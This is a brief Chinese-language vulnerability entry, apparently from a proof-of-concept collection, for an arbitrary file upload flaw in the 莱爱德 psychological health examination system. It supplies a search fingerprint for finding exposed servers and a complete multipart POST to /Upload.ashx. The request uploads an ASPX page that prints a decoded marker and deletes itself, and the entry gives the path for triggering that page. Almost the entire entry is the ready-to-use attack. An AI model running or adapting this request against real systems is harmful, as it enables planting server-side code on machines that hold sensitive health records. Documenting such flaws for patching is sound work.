# 莱爱德心理健康体检系统Upload存在任意文件上传漏洞

- **系统**：莱爱德心理健康体检系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="Ko_login_error"`
- **请求**：`POST /Upload.ashx HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: application/octet-stream
<%@Page Language="C#"%>
<%
Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
System.IO.File.Delete(Request.PhysicalPath);
%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
上传定位：
GET /Upload/editor/1348790308.aspx HTTP/1.1
```
- **预期**：200　|　—